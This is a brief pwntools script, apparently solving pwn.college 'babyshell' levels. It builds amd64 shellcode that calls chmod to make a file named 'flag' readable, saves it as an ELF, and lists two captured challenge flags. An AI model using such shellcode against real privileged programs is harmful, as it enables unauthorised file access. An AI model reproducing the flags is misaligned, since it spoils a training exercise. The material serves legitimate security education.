from pwn import *
# io = process('./babyshell_level')

context.arch = 'amd64'

sc = asm('''
    mov al, 0x5a              
    push 0x67616c66   
    push rsp
    pop rdi              
    push 0x4
    pop rsi
    syscall                   
	''')


# gdb.debug_shellcode(sc)
print(disasm(sc))
print(len(sc))

elf = ELF.from_bytes(sc)

elf.write(elf.entrypoint, sc)

# Save as an ELF binary
elf.save('shellcode_executable')

'''
level10
pwn.college{cnwNiDxI0X53kGxXZzdEU-8bJJn.QX2IjMsETM5kzW}
level 11
pwn.college{Yvgxwu4xwcRd1jrfrOHWc6gSFrE.QX3IjMsETM5kzW}
'''